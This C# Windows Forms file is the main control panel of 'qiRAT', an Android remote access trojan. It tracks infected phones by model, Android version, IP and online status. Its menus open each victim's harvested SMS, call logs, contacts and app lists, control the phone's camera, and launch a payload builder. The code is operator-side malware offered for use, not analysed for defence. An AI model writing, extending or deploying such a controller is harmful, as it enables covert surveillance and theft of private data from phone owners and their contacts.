using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.Logging;

//The concept and idea for the qiRAT application belong entirely to Rafig Zarbaliyev!
//If there is an error in the app or if you have any suggestions for additional features, please message me on Instagram(@rafok2v9c)

namespace qıRAT
{
    public partial class mainform : Form
    {
        private PerformanceCounter cpuCounter;
        private PerformanceCounter ramCounter;
        private Timer timer;
        public mainform()
        {
            InitializeComponent();
            cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            ramCounter = new PerformanceCounter("Memory", "Available MBytes");
            listViewdevices.ContextMenuStrip = contextMenuStrip1;
            this.caToolStripMenuItem.Click += caToolStripMenuItem_Click;
            this.contactsToolStripMenuItem.Click += contactsToolStripMenuItem_Click;
            this.applicationsToolStripMenuItem.Click += applicationsToolStripMenuItem_Click;

            // Timer'i baslat
            timer = new Timer();
            timer.Interval = 1000; // 1 saniyede bir guncelle
            timer.Tick += Timer_Tick;
            timer.Start();

            // Socket event'lerini bagla
            // Soket hadiselerini bagla
            socket.DeviceInfoReceived += Socket_DeviceInfoReceived;
            socket.ClientDisconnected += Socket_ClientDisconnected;

            this.MaximizeBox = false;
            portform pf = new portform(this); // "this" = mainform-u gonder
            pf.ShowDialog(); // Dialog kimi ac
            // portform baglananda bura qayidacaq ve mainform gorsenecek

        }

        // Soketden cihaz melumati gelende
        private void Socket_DeviceInfoReceived(object sender, DeviceInfo deviceInfo)
        {
            // UI thread-de isled
            if (listViewdevices.InvokeRequired)
            {
                listViewdevices.Invoke(new Action(() => Socket_DeviceInfoReceived(sender, deviceInfo)));
                return;
            }

            try
            {
                // Eyni cihaz ID-sine malik cihaz var mi yoxla
                ListViewItem existingItem = null;
                foreach (ListViewItem item in listViewdevices.Items)
                {
                    if (item.Tag != null && item.Tag.ToString() == deviceInfo.DeviceID)
                    {
                        existingItem = item;
                        break;
                    }
                }

                if (existingItem != null)
                {
                    // Movcud cihazi yenile (stun deyismez)
                    // SubItems[0] = ROW, [1] = Name, [2] = Device, [3] = Model, [4] = Ver, [5] = IP, [6] = Status
                    
                    // Evvelki statusu yoxla (Offline -> Online kecidi ucun ses)
                    string previousStatus = existingItem.SubItems.Count > 6 ? existingItem.SubItems[6].Text : "";
                    
                    // Ad (ID-nin ilk 8 simvolu)
                    if (existingItem.SubItems.Count > 1) existingItem.SubItems[1].Text = deviceInfo.DeviceID.Substring(0, Math.Min(8, deviceInfo.DeviceID.Length));
                    // Cihaz    
                    if (existingItem.SubItems.Count > 2) existingItem.SubItems[2].Text = deviceInfo.Manufacturer;
                    // Model
                    if (existingItem.SubItems.Count > 3) existingItem.SubItems[3].Text = deviceInfo.Model;
                    // Android Versiasi
                    if (existingItem.SubItems.Count > 4) existingItem.SubItems[4].Text = deviceInfo.AndroidVersion;
                    // IP Address
                    if (existingItem.SubItems.Count > 5) existingItem.SubItems[5].Text = deviceInfo.IPAddress;
                    // Status
                    if (existingItem.SubItems.Count > 6) existingItem.SubItems[6].Text = "Online";
                    
                    // Status rengini yasil et
                    existingItem.ForeColor = Color.Black;
                    
                    // Eger Offline-dan Online-a kecirse ses cal
                    if (previousStatus == "Offline")
                    {
                        PlayNotificationSound(true);
                    }
                }
                else
                {
                    // Yeni cihaz elave et
                    // ROW nomresini teyin et
                    string rowNumber = (listViewdevices.Items.Count + 1).ToString();
                    
                    ListViewItem newItem = new ListViewItem(rowNumber); // Col 0: ROW
                    newItem.SubItems.Add(deviceInfo.DeviceID.Substring(0, Math.Min(8, deviceInfo.DeviceID.Length))); // Col 1: Name
                    newItem.SubItems.Add(deviceInfo.Manufacturer); // Col 2: Device
                    newItem.SubItems.Add(deviceInfo.Model); // Col 3: Model
                    newItem.SubItems.Add(deviceInfo.AndroidVersion); // Col 4: Android Version
                    newItem.SubItems.Add(deviceInfo.IPAddress); // Col 5: IP Address
                    newItem.SubItems.Add("Online"); // Col 6: Status
                    
                    // Cihaz ID-ni tag olaraq saxla
                    newItem.Tag = deviceInfo.DeviceID;
                    
                    listViewdevices.Items.Add(newItem);
                    
                    // Ses cal (Online)
                    PlayNotificationSound(true);

                    // Yeni cihaz ucun qovluq yarat

                }
            }
            catch (Exception ex)
            {
              
            }
        }

        private void applicationsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = GetClientFilePath("applications.json");
            string deviceName = GetSelectedDeviceName();
            if (path != null)
            {
                new applicationsform(deviceName, path).Show();
            }
            else
            {
                //MessageBox.Show("Please select a device first.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        // Soketden elaqe ksilende
        private void Socket_ClientDisconnected(object sender, DeviceInfo deviceInfo)
        {
            if (listViewdevices.InvokeRequired)
            {
                listViewdevices.Invoke(new Action(() => Socket_ClientDisconnected(sender, deviceInfo)));
                return;
            }

            try
            {
                foreach (ListViewItem item in listViewdevices.Items)
                {
                    if (item.Tag != null && item.Tag.ToString() == deviceInfo.DeviceID)
                    {
                        // Statusu Offline et
                        if (item.SubItems.Count > 6)
                        {
                            item.SubItems[6].Text = "Offline";
                            item.ForeColor = Color.Red; // Offline oldugunu bildirmek ucun qirmizi et
                            // Ses cal (Offline)
                            PlayNotificationSound(false);
                        }
                        break;
                    }
                }
            }
            catch
            {
               
            }
        }

        private void listViewdevices_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ListViewItem item = listViewdevices.GetItemAt(e.X, e.Y);
                if (item != null)
                {
                    item.Selected = true;
                    contextMenuStrip1.Show(listViewdevices, e.Location);
                }
            }
        }

        // Yeni cihaz ucun qovluq yarat
        private void CreateDeviceFolder(string modelName)
        {
            try
            {
                // Gecersiz fayl simvollarini temizle
                string safeFolderName = string.Join("_", modelName.Split(Path.GetInvalidFileNameChars()));
                
                // Qovluq yolunu yarat
                string basePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "client");
                string deviceFolderPath = Path.Combine(basePath, safeFolderName);

                // Ana qovluqlari yarat (yoxdursa)
                if (!Directory.Exists(basePath))
                {
                    Directory.CreateDirectory(basePath);
                }

                // Cihaz qovlugunu yarat (yoxdursa)
                if (!Directory.Exists(deviceFolderPath))
                {
                    Directory.CreateDirectory(deviceFolderPath);
                }
            }
            catch (Exception ex)
            {
                
            }
        }
        private void Timer_Tick(object sender, EventArgs e)
        {
            // CPU istifadesi
            float cpuUsage = cpuCounter.NextValue();
            labelcpu.Text = $"{cpuUsage:0.0}%";

            // RAM istifadesi (Bos RAM)
            float availableRAM = ramCounter.NextValue();

            // Umumi RAM-i al
            var totalRAM = GetTotalPhysicalMemory() / 1024 / 1024; // MB cinsinden
            float usedRAM = totalRAM - availableRAM;
            float ramUsagePercent = (usedRAM / totalRAM) * 100;

            labelmemory.Text = $"{ramUsagePercent:0.0}%";

            // Sokete gelen veri istifadesi (KB cinsinden)
            long bytesReceived = socket.GetAndResetBytesReceived();
            double kilobytes = bytesReceived / 1024.0;
            labeldata.Text = $"{kilobytes:0.00} KB/s";
        }

        // Umumi RAM-i almaq ucun
        private long GetTotalPhysicalMemory()
        {
            Microsoft.VisualBasic.Devices.ComputerInfo computerInfo = new Microsoft.VisualBasic.Devices.ComputerInfo();
            return (long)computerInfo.TotalPhysicalMemory;
        }



        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            if (timer != null)
            {
                timer.Stop();
                timer.Dispose();
            }
            if (cpuCounter != null) cpuCounter.Dispose();
            if (ramCounter != null) ramCounter.Dispose();
        }

        private void caToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = GetClientFilePath("calls.json");
            string deviceName = GetSelectedDeviceName();
            if (path != null)
            {
                new callsform(deviceName, path).Show();
            }
            else
            {
                //MessageBox.Show("Please select a device first.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void contactsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = GetClientFilePath("contacts.json");
            string deviceName = GetSelectedDeviceName();
            if (path != null)
            {
                new contactsform(deviceName, path).Show();
            }
            else
            {
                //MessageBox.Show("Please select a device first.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        // SMS menyusu kliklenende
        private void sMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = GetClientFilePath("sms.json");
            string deviceName = GetSelectedDeviceName();
            if (path != null) 
            {
                new smsform(deviceName, path).Show();
            }
            else
            {
                //MessageBox.Show("Please select a device first.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }


        private string GetSelectedDeviceName()
        {
             if (listViewdevices.SelectedItems.Count > 0)
             {
                 string model = listViewdevices.SelectedItems[0].SubItems.Count > 3 ? listViewdevices.SelectedItems[0].SubItems[3].Text : "Unknown";
                 string id = listViewdevices.SelectedItems[0].Tag?.ToString() ?? "";
                 return $"{model}_{id.Substring(0, Math.Min(6, id.Length))}";
             }
             return "Device";
        }

        private string GetClientFilePath(string fileName)
        {
            string folderPath = GetSelectedDeviceFolderPath();
            if (!string.IsNullOrEmpty(folderPath))
            {
                return Path.Combine(folderPath, fileName);
            }
            return null;
        }

        private string GetSelectedDeviceFolderPath()
        {
            if (listViewdevices.SelectedItems.Count > 0)
            {
                string deviceID = listViewdevices.SelectedItems[0].Tag?.ToString();
                if (!string.IsNullOrEmpty(deviceID))
                {
                    // Soketden melumati almaga calis
                    DeviceInfo info = socket.GetDeviceInfo(deviceID);
                    if (info != null)
                    {
                        return info.FolderPath;
                    }
                }
                
                // Fallback: Model adindan qovluq tap
                if (listViewdevices.SelectedItems[0].SubItems.Count > 3)
                {
                    string model = listViewdevices.SelectedItems[0].SubItems[3].Text;
                    string safeModel = string.Join("_", model.Split(Path.GetInvalidFileNameChars()));
                    
                    // ID-ni al
                    string fullId = listViewdevices.SelectedItems[0].Tag.ToString();
                    string shortId = fullId.Length > 6 ? fullId.Substring(0, 6) : fullId;
                    
                    string folderName = safeModel + "_" + shortId;
                    
                    return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "client", folderName);
                }
            }
            return null;
        }

        private void OpenClientFile(string fileName)
        {
            string folderPath = GetSelectedDeviceFolderPath();
            if (!string.IsNullOrEmpty(folderPath))
            {
                string filePath = Path.Combine(folderPath, fileName);
                if (File.Exists(filePath))
                {
                    try
                    {
                        Process.Start("notepad.exe", filePath);
                    }
                    catch { }
                }
                else
                {
                    MessageBox.Show($"File not found: {fileName}\nWait for data to arrive.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void OpenClientFolder()
        {
            string folderPath = GetSelectedDeviceFolderPath();
            if (!string.IsNullOrEmpty(folderPath))
            {
                if (Directory.Exists(folderPath))
                {
                    Process.Start("explorer.exe", folderPath);
                }
            }
        }

        private void mainform_Load(object sender, EventArgs e)
        {
            listViewdevices.View = View.Details;
            listViewdevices.GridLines = true;
            listViewdevices.FullRowSelect = true;
            listViewdevices.Columns.Add("ROW", 50);
            listViewdevices.Columns.Add("Name", 80);
            listViewdevices.Columns.Add("Device", 80);
            listViewdevices.Columns.Add("Model", 70);
            listViewdevices.Columns.Add("Android Version", 90);
            listViewdevices.Columns.Add("IP Address", 80);
            listViewdevices.Columns.Add("Status", 150);

            // Context Menu Baglantilari 
            listViewdevices.ContextMenuStrip = contextMenuStrip1;
            cameraManagerToolStripMenuItem.Click += cameraManagerToolStripMenuItem_Click;
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            builderform form = new builderform();
            form.Show();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
       
            //aboutform frm = new aboutform();
            //frm.Show();
        }

        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            aboutform2 frm = new aboutform2();
            frm.Show();
        }

        private void cameraManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewdevices.SelectedItems.Count > 0)
            {
                // Tag icinde DeviceID saxlanir
                string deviceID = listViewdevices.SelectedItems[0].Tag as string;
                if (!string.IsNullOrEmpty(deviceID))
                {
                    new cameraform(deviceID).Show();
                }
            }
            else
            {
                //  MessageBox.Show("Please select a device first.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }


        // WMP obyektini class seviyyesinde saxlayiriq ki GC terefinden silinmesin
        private dynamic wmp;

        private void PlayNotificationSound(bool isOnline)
        {
            try
            {
                string fileName = isOnline ? "notificationonline.mp3" : "notificationoffline.mp3";
                string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "sounds", fileName);

                if (File.Exists(path))
                {
                    // Windows Media Player-i dinamik olaraq yarat
                    Type wmpType = Type.GetTypeFromProgID("WMPlayer.OCX");
                    if (wmpType != null)
                    {
                        wmp = Activator.CreateInstance(wmpType);
                        wmp.URL = path;
                        wmp.settings.volume = 100; // Ses seviyyesi
                        wmp.controls.play();
                    }
                }
                else
                {

                     //System.Media.SystemSounds.Beep.Play(); 
                }
            }
            catch (Exception)
            {
                
            }
        }

        private void clientFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = Path.Combine(Application.StartupPath, "res", "Client");

            if (Directory.Exists(path))
            {
                Process.Start("explorer.exe", path);
            }
            else
            {
                MessageBox.Show("Client folder not found!", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void usageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "https://github.com/rafigk2v9c/qiRAT",
                UseShellExecute = true
            });
        }
    }
}
